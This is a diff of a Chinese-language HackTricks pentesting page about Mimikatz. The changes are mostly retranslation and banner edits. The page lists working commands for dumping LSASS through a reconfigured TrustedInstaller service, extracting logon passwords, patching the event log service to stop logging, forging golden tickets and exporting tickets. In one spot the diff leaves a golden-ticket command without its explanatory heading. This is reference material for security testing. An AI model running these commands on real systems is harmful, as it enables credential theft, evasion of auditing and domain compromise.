@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-* 您在**网络安全公司**工作吗？想要在HackTricks中看到您的**公司广告**？或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我。
-* 通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧。
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord群组**](https://discord.gg/hRep4RUj7f) 或**电报群组**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
 
@@ -18,17 +18,17 @@
 
 从Windows 8.1和Windows Server 2012 R2开始，已经实施了重要措施来防止凭据盗窃：
 
-- **LM哈希和明文密码**不再存储在内存中以增强安全性。必须使用特定的注册表设置，即_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_，并将DWORD值设置为`0`以禁用摘要身份验证，确保LSASS中不缓存"明文"密码。
+- 为了增强安全性，**LM哈希和明文密码**不再存储在内存中。必须使用特定的注册表设置，即 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_，配置DWORD值为 `0` 以禁用摘要身份验证，确保LSASS中不缓存“明文”密码。
 
 - 引入**LSA保护**以保护本地安全机构（LSA）进程免受未经授权的内存读取和代码注入。通过将LSASS标记为受保护进程来实现这一点。激活LSA保护包括：
-1. 在注册表_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_中设置`RunAsPPL`为`dword:00000001`。
+1. 在注册表 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ 中设置 `RunAsPPL` 为 `dword:00000001`。
 2. 实施强制执行此注册表更改的组策略对象（GPO）跨受控设备。
 
 尽管有这些保护措施，像Mimikatz这样的工具可以使用特定驱动程序规避LSA保护，尽管此类操作可能会记录在事件日志中。
 
 ### 对抗SeDebugPrivilege的移除
 
-管理员通常具有SeDebugPrivilege，使他们能够调试程序。可以限制此特权以防止未经授权的内存转储，这是攻击者从内存中提取凭据的常见技术。然而，即使删除了此特权，TrustedInstaller帐户仍可以使用自定义服务配置执行内存转储：
+管理员通常具有SeDebugPrivilege，使他们能够调试程序。可以限制此特权以防止未经授权的内存转储，这是攻击者从内存中提取凭据的常见技术。然而，即使删除了此特权，TrustedInstaller账户仍然可以使用自定义服务配置执行内存转储：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -39,14 +39,14 @@ sc start TrustedInstaller
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-## Mimikatz 选项
+## Mimikatz选项
 
-Mimikatz 中的事件日志篡改涉及两个主要操作：清除事件日志和修补事件服务以防止记录新事件。以下是执行这些操作的命令：
+Mimikatz中的事件日志篡改涉及两个主要操作：清除事件日志和修补事件服务以防止记录新事件。以下是执行这些操作的命令：
 
 #### 清除事件日志
 
 - **命令**：此操作旨在删除事件日志，使跟踪恶意活动变得更加困难。
-- Mimikatz 在其标准文档中没有直接提供清除事件日志的命令。然而，事件日志操作通常涉及使用系统工具或脚本在 Mimikatz 外部清除特定日志（例如，使用 PowerShell 或 Windows 事件查看器）。
+- Mimikatz在其标准文档中没有直接提供清除事件日志的命令。但是，事件日志操作通常涉及使用系统工具或脚本（例如使用PowerShell或Windows事件查看器）在Mimikatz之外清除特定日志。
 
 #### 实验性功能：修补事件服务
 
@@ -54,26 +54,8 @@ Mimikatz 中的事件日志篡改涉及两个主要操作：清除事件日志�
 - 这个实验性命令旨在修改事件记录服务的行为，有效地阻止其记录新事件。
 - 示例：`mimikatz "privilege::debug" "event::drop" exit`
 
-- `privilege::debug` 命令确保 Mimikatz 以必要的特权来操作修改系统服务。
-- `event::drop` 命令然后修补事件记录服务。
-
-
-### Kerberos 票据攻击
-
-### 金票据创建
-
-金票据允许在整个域中进行访问冒充。关键命令和参数：
-
-- 命令：`kerberos::golden`
-- 参数：
-- `/domain`：域名。
-- `/sid`：域的安全标识符（SID）。
-- `/user`：要冒充的用户名。
-- `/krbtgt`：域的 KDC 服务帐户的 NTLM 哈希。
-- `/ptt`：直接将票据注入内存。
-- `/ticket`：保存票据以供以后使用。
-
-示例：
+- `privilege::debug`命令确保Mimikatz具有修改系统服务所需的特权。
+- `event::drop`命令然后修补事件记录服务。
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
@@ -173,7 +155,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: 从内存中提取Kerberos票证。
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### SID和令牌操作
+### Sid和令牌操作
 
 - **SID::add/modify**: 更改SID和SIDHistory。
 - 添加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
